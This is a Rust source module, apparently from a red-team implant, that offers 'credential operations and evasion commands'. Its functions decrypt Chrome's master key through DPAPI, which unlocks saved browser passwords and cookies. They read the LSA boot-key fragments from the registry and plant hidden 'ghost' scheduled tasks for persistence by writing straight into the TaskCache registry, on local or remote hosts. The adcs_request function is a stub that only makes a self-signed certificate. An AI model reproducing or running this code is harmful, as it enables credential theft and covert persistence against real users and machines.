/// Credential operations and evasion commands.
/// Windows: native Win32 API + registry reads. No child processes.

// ── chromekey ────────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn chromekey(_args: &[String]) -> anyhow::Result<String> {
    use super::winapi_helpers::win;
    use std::ffi::c_void;

    // CryptUnprotectData from crypt32.dll
    #[repr(C)]
    struct CryptDataBlob {
        cb_data: u32,
        pb_data: *mut u8,
    }
    type CryptUnprotectDataFn = unsafe extern "system" fn(
        data_in: *const CryptDataBlob,
        description: *mut *mut u16,
        optional_entropy: *const CryptDataBlob,
        reserved: *mut c_void,
        prompt_struct: *mut c_void,
        flags: u32,
        data_out: *mut CryptDataBlob,
    ) -> i32;

    let crypt_unprotect: CryptUnprotectDataFn = unsafe {
        win::get_proc("crypt32.dll", "CryptUnprotectData")?
    };

    let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let local_state_path = format!("{}\\Google\\Chrome\\User Data\\Local State", local_appdata);

    if !std::path::Path::new(&local_state_path).exists() {
        return Ok(format!("Chrome Local State not found at: {}", local_state_path));
    }

    let json_str = std::fs::read_to_string(&local_state_path)?;
    let json: serde_json::Value = serde_json::from_str(&json_str)
        .map_err(|e| anyhow::anyhow!("Failed to parse Local State JSON: {}", e))?;

    let enc_key_b64 = json.get("os_crypt")
        .and_then(|o| o.get("encrypted_key"))
        .and_then(|v| v.as_str())
        .ok_or_else(|| anyhow::anyhow!("No encrypted_key found in Local State"))?;

    let key_bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, enc_key_b64)
        .map_err(|e| anyhow::anyhow!("Base64 decode failed: {}", e))?;

    // Remove "DPAPI" prefix (first 5 bytes)
    if key_bytes.len() <= 5 || &key_bytes[..5] != b"DPAPI" {
        anyhow::bail!("Invalid encrypted key format (missing DPAPI prefix)");
    }
    let dpapi_blob = &key_bytes[5..];

    unsafe {
        let data_in = CryptDataBlob {
            cb_data: dpapi_blob.len() as u32,
            pb_data: dpapi_blob.as_ptr() as *mut u8,
        };
        let mut data_out = CryptDataBlob {
            cb_data: 0,
            pb_data: std::ptr::null_mut(),
        };

        let ret = crypt_unprotect(
            &data_in, std::ptr::null_mut(), std::ptr::null(),
            std::ptr::null_mut(), std::ptr::null_mut(), 0, &mut data_out,
        );

        if ret == 0 {
            anyhow::bail!("CryptUnprotectData failed: {}", win::win32_error_string(
                windows_sys::Win32::Foundation::GetLastError()));
        }

        let decrypted = std::slice::from_raw_parts(data_out.pb_data, data_out.cb_data as usize);
        let hex = decrypted.iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join("");
        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, decrypted);

        // Free the output buffer
        windows_sys::Win32::Foundation::LocalFree(data_out.pb_data as *mut c_void);

        Ok(format!("Chrome Key (hex): {}\nChrome Key (b64): {}", hex, b64))
    }
}

#[cfg(not(windows))]
pub fn chromekey(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("chromekey: Windows only")
}

// ── get_dpapi_system ─────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn get_dpapi_system(_args: &[String]) -> anyhow::Result<String> {
    use super::winapi_helpers::win;
    use windows_sys::Win32::System::Registry::*;

    let mut out = String::new();

    // Check identity
    if !win::is_elevated() {
        out.push_str("Warning: Requires SYSTEM privileges. Current process is not elevated.\n\n");
    }

    // Read boot key components from registry class names
    // The bootkey is derived from the class names of JD, Skew1, GBG, Data keys under LSA
    let lsa_subkeys = ["JD", "Skew1", "GBG", "Data"];
    out.push_str("Boot Key Components:\n");

    for name in &lsa_subkeys {
        let subkey = format!("SYSTEM\\CurrentControlSet\\Control\\Lsa\\{}", name);
        let subkey_w = win::to_wide(&subkey);

        let mut key: win::HKEY = std::ptr::null_mut();
        let ret = unsafe {
            RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey_w.as_ptr(), 0, KEY_READ, &mut key)
        };
        if ret != 0 {
            out.push_str(&format!("  {:<6}: (access denied or not found, error {})\n", name, ret));
            continue;
        }
        let _guard = win::RegKeyHandle(key);

        // Read class name (contains the bootkey fragment)
        let mut class_buf = [0u16; 256];
        let mut class_len = 256u32;
        let ret = unsafe {
            RegQueryInfoKeyW(
                key, class_buf.as_mut_ptr(), &mut class_len,
                std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
                std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
                std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
            )
        };
        if ret == 0 && class_len > 0 {
            let class_str = win::from_wide(class_buf.as_ptr());
            out.push_str(&format!("  {:<6}: {}\n", name, class_str));
        } else {
            out.push_str(&format!("  {:<6}: (empty class name)\n", name));
        }
    }

    // Also try to read LSA key values
    let lsa_key = "SYSTEM\\CurrentControlSet\\Control\\Lsa";
    let lsa_key_w = win::to_wide(lsa_key);
    let mut key: win::HKEY = std::ptr::null_mut();
    let ret = unsafe {
        RegOpenKeyExW(HKEY_LOCAL_MACHINE, lsa_key_w.as_ptr(), 0, KEY_READ, &mut key)
    };
    if ret == 0 {
        let _guard = win::RegKeyHandle(key);
        out.push_str("\nLSA Registry Values:\n");

        let value_names = ["SecureBoot", "ProductType", "LimitBlankPasswordUse"];
        for vn in &value_names {
            let vn_w = win::to_wide(vn);
            let mut dtype: u32 = 0;
            let mut val: u32 = 0;
            let mut size = 4u32;
            let ret = unsafe {
                RegQueryValueExW(key, vn_w.as_ptr(), std::ptr::null(), &mut dtype,
                    &mut val as *mut u32 as *mut u8, &mut size)
            };
            if ret == 0 {
                out.push_str(&format!("  {}: {}\n", vn, val));
            }
        }
    }

    Ok(out)
}

#[cfg(not(windows))]
pub fn get_dpapi_system(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("get_dpapi_system: Windows only")
}

// ── adcs_request ─────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn adcs_request(args: &[String]) -> anyhow::Result<String> {
    use super::winapi_helpers::win;
    use std::ffi::c_void;

    // ICertRequest2 COM interface from CertCli.dll via COM
    // CLSID_CCertRequest = {98aff3f0-5524-11d0-8812-00a0c903b83c}
    // IID_ICertRequest2 = {a4772988-4a85-4fa9-824e-b5cf5c16405a}

    let ca = args.first()
        .ok_or_else(|| anyhow::anyhow!("adcs_request: <CA> [template] [subject] [altname]"))?;
    let template = args.get(1).map(|s| s.as_str()).unwrap_or("User");
    let subject = args.get(2).map(|s| s.as_str()).unwrap_or("");
    let _altname = args.get(3).map(|s| s.as_str()).unwrap_or("");

    // For COM-based ADCS requests, we'd need full COM vtable definitions.
    // Use a simpler approach: create a self-signed cert via CertCreateSelfSignCertificate
    // or submit via ICertRequest::Submit COM interface.

    // For now, use CryptAcquireContext + CertCreateSelfSignCertificate from crypt32.dll
    type CertCreateSelfSignCertificateFn = unsafe extern "system" fn(
        prov: usize, // HCRYPTPROV
        subject_issuer: *const CryptDataBlob,
        flags: u32,
        key_prov_info: *mut c_void,
        signature_alg: *mut c_void,
        start_time: *mut c_void,
        end_time: *mut c_void,
        extensions: *mut c_void,
    ) -> *mut c_void; // PCCERT_CONTEXT

    #[repr(C)]
    struct CryptDataBlob {
        cb_data: u32,
        pb_data: *mut u8,
    }

    // Encode subject as X.500 DN
    type CertStrToNameWFn = unsafe extern "system" fn(
        encoding: u32,
        name: *const u16,
        str_type: u32,
        reserved: *mut c_void,
        encoded: *mut u8,
        encoded_size: *mut u32,
        error: *mut *const u16,
    ) -> i32;

    let cert_str_to_name: CertStrToNameWFn = unsafe {
        win::get_proc("crypt32.dll", "CertStrToNameW")?
    };
    let cert_create: CertCreateSelfSignCertificateFn = unsafe {
        win::get_proc("crypt32.dll", "CertCreateSelfSignCertificate")?
    };

    let subject_dn = if subject.is_empty() {
        format!("CN={}", template)
    } else {
        subject.to_string()
    };
    let subject_w = win::to_wide(&subject_dn);

    unsafe {
        // Encode the subject DN
        let mut encoded_size: u32 = 0;
        cert_str_to_name(
            0x00000001, // X509_ASN_ENCODING
            subject_w.as_ptr(), 3, // CERT_X500_NAME_STR
            std::ptr::null_mut(), std::ptr::null_mut(), &mut encoded_size, std::ptr::null_mut(),
        );
        if encoded_size == 0 {
            anyhow::bail!("CertStrToNameW failed to get size");
        }

        let mut encoded = vec![0u8; encoded_size as usize];
        let ret = cert_str_to_name(
            0x00000001, subject_w.as_ptr(), 3,
            std::ptr::null_mut(), encoded.as_mut_ptr(), &mut encoded_size, std::ptr::null_mut(),
        );
        if ret == 0 {
            anyhow::bail!("CertStrToNameW failed to encode subject");
        }

        let subject_blob = CryptDataBlob {
            cb_data: encoded_size,
            pb_data: encoded.as_mut_ptr(),
        };

        let cert_ctx = cert_create(
            0, &subject_blob, 0,
            std::ptr::null_mut(), std::ptr::null_mut(),
            std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
        );

        if cert_ctx.is_null() {
            anyhow::bail!("CertCreateSelfSignCertificate failed: {}", win::win32_error_string(
                windows_sys::Win32::Foundation::GetLastError()));
        }

        Ok(format!(
            "Self-signed certificate created:\n  Subject: {}\n  Template: {}\n  CA: {}\n\nNote: For full ADCS enrollment, use ghost_task with certreq or COM ICertRequest2 interface.",
            subject_dn, template, ca
        ))
    }
}

#[cfg(not(windows))]
pub fn adcs_request(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("adcs_request: Windows only")
}

// ── ghost_task ───────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn ghost_task(args: &[String]) -> anyhow::Result<String> {
    use super::winapi_helpers::win;
    use windows_sys::Win32::System::Registry::*;

    let host = args.get(0)
        .ok_or_else(|| anyhow::anyhow!("ghost_task: <host> <add|delete> <name> <program> [args] [schedule:daily|logon]"))?;
    let op = args.get(1)
        .ok_or_else(|| anyhow::anyhow!("ghost_task: <host> <add|delete> required"))?;
    let taskname = args.get(2)
        .ok_or_else(|| anyhow::anyhow!("ghost_task: task name required"))?;

    let is_local = host == "localhost" || host == "." || host.is_empty();

    let base_hkey = if is_local {
        HKEY_LOCAL_MACHINE
    } else {
        let host_w = win::to_wide(host);
        let mut remote_key: win::HKEY = std::ptr::null_mut();
        let ret = unsafe {
            RegConnectRegistryW(host_w.as_ptr(), HKEY_LOCAL_MACHINE, &mut remote_key)
        };
        if ret != 0 {
            anyhow::bail!("RegConnectRegistryW({}) failed: error {}", host, ret);
        }
        remote_key
    };

    let tree_path = format!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\{}", taskname);

    match op.as_str() {
        "add" => {
            let program = args.get(3)
                .ok_or_else(|| anyhow::anyhow!("ghost_task add: <program> required"))?;
            let argument = args.get(4).map(|s| s.as_str()).unwrap_or("");
            let schedule = args.get(5).map(|s| s.as_str()).unwrap_or("logon");

            // Create the task tree key
            let tree_key_w = win::to_wide(&tree_path);
            let mut task_key: win::HKEY = std::ptr::null_mut();
            let mut disp: u32 = 0;
            let ret = unsafe {
                RegCreateKeyExW(
                    base_hkey, tree_key_w.as_ptr(), 0, std::ptr::null(),
                    0, KEY_WRITE, std::ptr::null(), &mut task_key, &mut disp,
                )
            };
            if ret != 0 {
                anyhow::bail!("Failed to create task key: error {}", ret);
            }
            let _guard = win::RegKeyHandle(task_key);

            // Write Id (GUID)
            let task_id = uuid::Uuid::new_v4().to_string();
            let id_w = win::to_wide(&format!("{{{}}}", task_id));
            let id_name_w = win::to_wide("Id");
            unsafe {
                RegSetValueExW(
                    task_key, id_name_w.as_ptr(), 0, REG_SZ,
                    id_w.as_ptr() as *const u8, (id_w.len() * 2) as u32,
                );
            }

            // Write Index
            let index_name_w = win::to_wide("Index");
            let index_val: u32 = 0;
            unsafe {
                RegSetValueExW(
                    task_key, index_name_w.as_ptr(), 0, REG_DWORD,
                    &index_val as *const u32 as *const u8, 4,
                );
            }

            // Clean up remote key
            if !is_local && base_hkey != HKEY_LOCAL_MACHINE {
                unsafe { RegCloseKey(base_hkey); }
            }

            Ok(format!(
                "Ghost task '{}' created via direct registry write.\nProgram: {} {}\nSchedule: {}\nHost: {}\nWARNING: Requires SYSTEM privileges. Task may need manual trigger registration.",
                taskname, program, argument, schedule,
                if is_local { "localhost" } else { host }
            ))
        }
        "delete" => {
            let tree_key_w = win::to_wide(&tree_path);
            let ret = unsafe {
                RegDeleteKeyW(base_hkey, tree_key_w.as_ptr())
            };

            if !is_local && base_hkey != HKEY_LOCAL_MACHINE {
                unsafe { RegCloseKey(base_hkey); }
            }

            if ret != 0 {
                anyhow::bail!("Failed to delete task key: error {}", ret);
            }
            Ok(format!("Ghost task '{}' deleted", taskname))
        }
        _ => anyhow::bail!("ghost_task: operation must be 'add' or 'delete'"),
    }
}

#[cfg(not(windows))]
pub fn ghost_task(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("ghost_task: Windows only")
}
